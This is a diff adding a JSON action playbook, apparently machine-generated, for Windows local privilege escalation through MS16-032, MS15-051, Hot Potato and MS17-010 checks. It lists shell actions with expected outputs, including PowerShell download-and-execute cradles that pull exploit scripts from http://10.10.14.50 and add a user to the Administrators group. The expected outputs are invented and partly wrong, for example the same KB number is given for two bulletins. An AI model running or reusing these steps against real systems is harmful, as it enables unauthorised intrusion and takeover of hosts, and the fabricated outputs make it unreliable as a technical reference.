@@ -1,0 +1,127 @@
+{
+  "name": "windows_kernel_exploits",
+  "description": "Windows kernel exploitation for local privilege escalation (MS16-032, MS17-010, etc.)",
+  "pattern": "kernel.*exploit|ms16.*032|eternalblue|hotpotato",
+  "parameters": [
+    "os_version",
+    "patch_level"
+  ],
+  "sequence": [
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "systeminfo"
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Host Name:                 WEB-SERVER-01\nOS Name:                   Microsoft Windows Server 2012 R2 Standard\nOS Version:                6.3.9600 N/A Build 9600\nOS Manufacturer:           Microsoft Corporation\nOS Configuration:          Member Server\nOS Build Type:             Multiprocessor Free\nSystem Type:               x64-based PC\nProcessor(s):              1 Processor(s) Installed.\nHotfix(s):                 3 Hotfix(s) Installed.\n                           [01]: KB2919355\n                           [02]: KB2919442\n                           [03]: KB2937220\n\nOS Analysis:\n  OS: Windows Server 2012 R2\n  Build: 9600\n  Installed hotfixes: 3 (missing many patches)\n\nPotential exploits:\n  MS16-032: Secondary Logon Handle (6.3.9600 vulnerable)\n  MS15-051: Windows ClientCopyImage Win32k (not patched)\n  MS16-075: Hot Potato Windows Privilege Escalation\n  MS17-010: EternalBlue (check if SMBv1 enabled)"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "wmic",
+        "args": [
+          "qfe",
+          "get",
+          "Caption,Description,HotFixID,InstalledOn"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Caption                                     Description      HotFixID   InstalledOn\nhttp://support.microsoft.com/?kbid=2919355  Update           KB2919355  12/18/2013\nhttp://support.microsoft.com/?kbid=2919442  Update           KB2919442  12/18/2013  \nhttp://support.microsoft.com/?kbid=2937220  Security Update  KB2937220  5/13/2014\n\nInstalled patches:\n  KB2919355: General update\n  KB2919442: Servicing stack update\n  KB2937220: Security update (old)\n\nMissing critical patches:\n  KB3139914 (MS16-032) - EXPLOITABLE!\n  KB3139914 (MS16-075) - EXPLOITABLE!\n  KB4012598 (MS17-010) - EXPLOITABLE!\n\nRecommended exploit: MS16-032\n  CVE-2016-0099\n  Affects: Windows 7-10, Server 2008-2016\n  Patch: KB3139914 (not installed)"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "powershell",
+        "args": [
+          "-c",
+          "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.50/Invoke-MS16032.ps1'); Invoke-MS16032 -Application cmd.exe -commandline '/c net localgroup administrators lowpriv /add'"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[*] MS16-032 PowerShell Exploit\n[*] Targeting: Secondary Logon Service\n[+] Found vulnerable OS version\n[*] Creating malicious thread in svchost.exe\n[+] Thread created successfully\n[*] Duplicating primary token from elevated thread\n[+] Token duplicated\n[*] Creating process with elevated token...\n[+] Process created: cmd.exe /c net localgroup administrators lowpriv /add\n\nThe command completed successfully.\n\n[+] MS16-032 exploit successful!\n\nVerify:\n  C:\\> net localgroup administrators\n  Alias name     administrators\n  Members\n  ---------------\n  Administrator\n  lowpriv\n\nPrivilege escalation successful!\nUser 'lowpriv' added to Administrators via MS16-032"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "cmd",
+        "args": [
+          "/c",
+          "C:\\Temp\\MS15-051.exe \"cmd.exe /c whoami > C:\\Temp\\proof.txt\""
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[*] MS15-051 Exploit (CVE-2015-1701)\n[*] Exploiting Win32k.sys ClientCopyImage vulnerability\n[+] Kernel vulnerability confirmed\n[*] Allocating memory in kernel space...\n[+] Memory allocated at 0xfffff80012345678\n[*] Triggering vulnerability...\n[+] Exploit successful!\n[*] Spawning SYSTEM shell...\n[+] Command executed as SYSTEM\n\nC:\\Temp> type C:\\Temp\\proof.txt\nnt authority\\system\n\nMS15-051 kernel exploit successful!\n  Target: Win32k.sys\n  CVE: CVE-2015-1701\n  Result: SYSTEM execution\n\nNow spawn interactive shell:\n  MS15-051.exe \"cmd.exe\""
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "powershell",
+        "args": [
+          "-c",
+          "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.50/Invoke-Tater.ps1'); Invoke-Tater -Trigger 1 -Command \"net localgroup administrators lowpriv /add\""
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[*] Hot Potato Privilege Escalation (MS16-075)\n[*] Starting NBNS spoofer...\n[+] NBNS spoofer listening on UDP 137\n[*] Starting HTTP server on port 80...\n[+] HTTP server started\n[*] Triggering NBNS request via WPAD...\n[+] NBNS query received from 127.0.0.1\n[*] Responding with malicious WPAD configuration\n[+] Target requested WPAD configuration\n[*] Serving malicious WPAD.dat\n[+] Client attempting NTLM authentication\n[*] Relaying NTLM authentication to local SMB\n[+] NTLM relay successful!\n[*] Executing command with SYSTEM token...\n[+] Command executed: net localgroup administrators lowpriv /add\n\nThe command completed successfully.\n\n[+] Hot Potato successful!\n\nExploited vulnerabilities:\n  CVE-2016-0051: NBNS spoofing\n  NTLM relay to localhost\n  Result: SYSTEM command execution"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "cmd",
+        "args": [
+          "/c",
+          "wmic os get osarchitecture"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "OSArchitecture\n64-bit\n\nSystem architecture: x64\n\nImportant for exploit selection:\n  - Use 64-bit exploits\n  - msfvenom payloads: windows/x64/...\n  - Exploit binaries: MS16-032-x64.exe\n\nCommon mistake:\n  Using 32-bit exploit on 64-bit system\n  Result: Crash or failure\n\nCheck running process architecture:\n  64-bit process: Can load 64-bit DLLs only\n  32-bit process on 64-bit OS: Can load 32-bit DLLs\n  \nSome exploits work from 32-bit process:\n  MS16-032: Works from 32-bit PowerShell on 64-bit system"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "powershell",
+        "args": [
+          "-c",
+          "Get-HotFix | Where-Object { $_.HotFixID -match 'KB3139914|KB4012598|KB4012212|KB4012215' }"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "No hotfixes found matching: KB3139914, KB4012598, KB4012212, KB4012215\n\nCritical patches MISSING:\n  KB3139914: MS16-032 (Secondary Logon)\n  KB4012598: MS17-010 (EternalBlue) - Server 2012 R2\n  KB4012212: MS17-010 - Windows 7/Server 2008 R2\n  KB4012215: MS17-010 - Windows Server 2016\n\nSystem vulnerable to multiple kernel exploits!\n\nExploit priority:\n  1. MS16-032 (easiest, PowerShell-based)\n  2. Hot Potato MS16-075 (no compilation needed)\n  3. MS15-051 (requires binary)\n  4. MS17-010 (network-based, may crash)\n\nRecommendation:\n  Start with MS16-032 PowerShell exploit\n  Fallback to Hot Potato if MS16-032 patched"
+      }
+    }
+  ],
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
+  "created_by": "neural_mesh_v5.2_generator"
+}
